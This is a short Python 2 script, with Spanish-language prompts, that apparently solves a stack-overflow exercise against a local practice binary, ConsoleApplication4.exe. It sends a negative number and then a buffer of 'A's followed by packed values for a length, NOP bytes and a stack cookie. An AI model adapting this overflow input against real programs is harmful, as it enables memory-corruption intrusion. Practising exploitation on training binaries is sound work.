from subprocess import *
import struct
p = Popen([r'ConsoleApplication4.exe', 'f'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)



print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

primera="-1\n"
p.stdin.write(primera)


numero=struct.pack("<L",0x1c)
c=struct.pack("<L",0x90909090)
cookie=struct.pack("<L",0x45934215)

fruta= "A" * 16 + numero + c + cookie + "\n"
p.stdin.write(fruta)

testresult = p.communicate()[0]


print(testresult)


